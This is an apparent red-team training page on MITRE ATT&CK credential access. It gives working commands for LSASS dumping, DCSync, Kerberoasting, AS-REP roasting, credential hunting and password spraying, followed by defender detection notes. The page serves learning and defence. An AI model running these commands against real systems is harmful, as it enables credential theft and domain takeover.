---
layout: training-page
title: "TA0006 — Credential Access — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - credential-access
  - mimikatz
  - kerberoasting
  - lsass
  - hash-dumping
page_key: "mitre-ta0006"
render_with_liquid: false
---

# TA0006 — Credential Access

Credential Access is one of the most impactful tactics in a red team engagement. Stealing credentials — hashes, cleartext passwords, Kerberos tickets, or session tokens — allows adversaries to authenticate as legitimate users, move laterally without exploitation, and escalate to Domain Admin without triggering EDR alerts on exploit behavior. In modern AD environments, credential access is often the fastest path from a foothold to full domain compromise.

The most impactful techniques here are LSASS dumping (Mimikatz), Kerberoasting (offline hash cracking), DCSync (replicating the entire domain's hashes), and AS-REP Roasting for accounts without pre-authentication.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1003 | OS Credential Dumping | T1003.001 LSASS Memory | Mimikatz, procdump, nanodump, pypykatz |
| T1003 | OS Credential Dumping | T1003.002 Security Account Manager | reg save SAM; impacket secretsdump |
| T1003 | OS Credential Dumping | T1003.003 NTDS | ntdsutil, secretsdump against DC |
| T1003 | OS Credential Dumping | T1003.004 LSA Secrets | reg query HKLM\SECURITY — service creds |
| T1003 | OS Credential Dumping | T1003.005 Cached Domain Credentials | NL$KM decryption — offline domain logons |
| T1003 | OS Credential Dumping | T1003.006 DCSync | Mimikatz lsadump::dcsync — no local access needed |
| T1003 | OS Credential Dumping | T1003.007 /proc/pid/mem | Linux LSASS equivalent via /proc |
| T1003 | OS Credential Dumping | T1003.008 /etc/passwd + /etc/shadow | Linux hash extraction |
| T1110 | Brute Force | T1110.001 Password Guessing | Online auth guessing |
| T1110 | Brute Force | T1110.002 Password Cracking | Offline hash cracking with hashcat/John |
| T1110 | Brute Force | T1110.003 Password Spraying | Single password → many accounts (avoids lockout) |
| T1110 | Brute Force | T1110.004 Credential Stuffing | Breach dump creds against target services |
| T1555 | Credentials from Password Stores | T1555.003 Web Browsers | Chrome/Firefox plaintext credential extraction |
| T1555 | Credentials from Password Stores | T1555.004 Windows Credential Manager | vault::cred; LaZagne |
| T1555 | Credentials from Password Stores | T1555.005 Password Managers | KeePass, 1Password memory extraction |
| T1558 | Steal/Forge Kerberos Tickets | T1558.001 Golden Ticket | Forge TGT with krbtgt hash — 10-year validity |
| T1558 | Steal/Forge Kerberos Tickets | T1558.002 Silver Ticket | Forge service ticket without KDC involvement |
| T1558 | Steal/Forge Kerberos Tickets | T1558.003 Kerberoasting | Request SPN tickets → offline crack |
| T1558 | Steal/Forge Kerberos Tickets | T1558.004 AS-REP Roasting | Users without pre-auth → offline crack |
| T1552 | Unsecured Credentials | T1552.001 Credentials In Files | config files, .env, scripts with hardcoded creds |
| T1552 | Unsecured Credentials | T1552.002 Credentials in Registry | Autologon credentials, VNC creds in registry |
| T1552 | Unsecured Credentials | T1552.003 Bash History | ~/.bash_history with passwords typed as args |
| T1552 | Unsecured Credentials | T1552.004 Private Keys | SSH keys, PFX/PEM files, .ppk files |
| T1552 | Unsecured Credentials | T1552.006 Group Policy Preferences | SYSVOL GPP cPassword — decryptable |
| T1539 | Steal Web Session Cookie | — | Browser cookie theft → session hijacking |
| T1056 | Input Capture | T1056.001 Keylogging | Hardware or software keylogger |
| T1056 | Input Capture | T1056.002 GUI Input Capture | Fake UAC prompt to capture credentials |
| T1111 | MFA Interception | — | OTP theft via AiTM proxy or SS7 |
| T1621 | MFA Request Generation | — | MFA fatigue attack — flood Authenticator app |
| T1557 | Adversary-in-the-Middle | T1557.001 LLMNR/NBT-NS Poisoning | Responder — capture NTLMv2 hashes |
| T1557 | Adversary-in-the-Middle | T1557.002 ARP Cache Poisoning | Bettercap ARP spoofing for credential intercept |

## Red Team Tooling

### LSASS Dumping

```
# Mimikatz — classic LSASS dump (triggers most AV/EDR)
privilege::debug
sekurlsa::logonpasswords

# Procdump — create minidump for offline parsing
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Parse offline with pypykatz:
pypykatz lsa minidump lsass.dmp

# NanoDump — LSASS dump with EDR evasion (forks, handles, SSP)
nanodump.exe --write C:\Windows\Temp\lsass.dmp --valid
# Parse with pypykatz

# Task Manager dump (GUI — no AV trigger for dump creation itself)
# Right-click lsass.exe → Create dump file → %temp%\lsass.DMP

# Comsvcs.dll LOLBin dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \
  C:\Windows\Temp\lsass.dmp full
```

### DCSync (Requires Domain Admin or Replication rights)

```
# Mimikatz DCSync — replicate NTLM hash for any account
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv   # dump all hashes

# Impacket secretsdump — Python DCSync (doesn't require local access)
python3 secretsdump.py DOMAIN/DA_User:password@DC_IP -outputfile hashes.txt
python3 secretsdump.py -hashes :NTLM_HASH DOMAIN/DA_User@DC_IP
```

### Kerberoasting

```
# Rubeus — request all roastable SPN tickets
Rubeus.exe kerberoast /format:hashcat /output:spn_hashes.txt

# Rubeus — target high-value accounts only
Rubeus.exe kerberoast /user:svc_sql /format:hashcat /output:sql_hash.txt

# Impacket GetUserSPNs (remote, from Linux)
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -outputfile spn_hashes.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### AS-REP Roasting

```
# Rubeus — find and roast accounts without pre-auth
Rubeus.exe asreproast /format:hashcat /output:asrep_hashes.txt

# Impacket GetNPUsers (remote, from Linux)
python3 GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
python3 GetNPUsers.py DOMAIN/ -dc-ip DC_IP -request -no-pass

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Credential Hunting (Unsecured Creds)

```
# Search file system for credentials
findstr /si "password" *.txt *.xml *.ini *.config
Get-ChildItem -Recurse -Include *.config,*.xml,*.ini | Select-String -Pattern "password|pass|pwd"

# GPP cPassword (SYSVOL)
findstr /s /i cpassword \\DC_IP\SYSVOL\
# Decrypt with gpp-decrypt or Invoke-GPPPassword:
gpp-decrypt ENCRYPTED_CPASSWORD

# Browser credentials
LaZagne.exe browsers
# Impacket dpapi to decrypt Chrome master key
python3 dpapi.py masterkey -file MASTERKEY_FILE -password USER_PASSWORD

# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Password Spraying

```
# TREVORspray — smart O365 / Entra ID spraying with lockout awareness
TREVORspray spray -u userlist.txt -p 'Spring2024!' --delay 1800

# Kerbrute — internal AD password spraying (uses Kerberos, no failed logon events by default)
kerbrute passwordspray -d corp.local userlist.txt 'Password123!'

# CrackMapExec — SMB password spraying
cme smb DC_IP -u userlist.txt -p 'Password123!' --continue-on-success
```

## Detection Notes

- **LSASS access**: Event ID 10 (Sysmon process access to lsass.exe); Windows Credential Guard prevents most LSASS dumps on protected systems; PPL (Protected Process Light) blocks procdump by default on patched systems
- **DCSync**: Event ID 4662 on domain controller — look for `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (replication GUID) from non-DC accounts
- **Kerberoasting**: Event ID 4769 (Kerberos service ticket requested) with encryption type 0x17 (RC4-HMAC) — AES-encrypted service accounts are unroastable
- **AS-REP Roasting**: Event ID 4768 (TGT requested) with pre-auth not required accounts
- **Responder / LLMNR poisoning**: LLMNR and NBT-NS traffic is often anomalous on modern networks; disable LLMNR via GPO to mitigate
- **MFA fatigue**: unusual spike in push notifications to Authenticator app; some vendors provide alerting on repeated denied pushes

## Related Academy Pages

- [LSASS Dumping](/post-exploitation/lsass-dumping/)
- [Kerberoasting & AS-REP](/active-directory/kerberoasting/)
- [DCSync & Golden Ticket](/active-directory/dcsync/)
- [Password Cracking Guide](/exploitation/password-cracking-guide/)
- [Responder & LLMNR Poisoning](/network-attacks/responder/)
- [DPAPI Abuse & Credential Extraction](/active-directory/dpapi-abuse/)
- [Browser Credential Extraction](/post-exploitation/browser-credentials/)
- [Windows Credential Manager Attacks](/post-exploitation/credential-manager/)

## Resources

- [TA0006 — MITRE ATT&CK Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [T1003 — OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
- [T1558 — Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
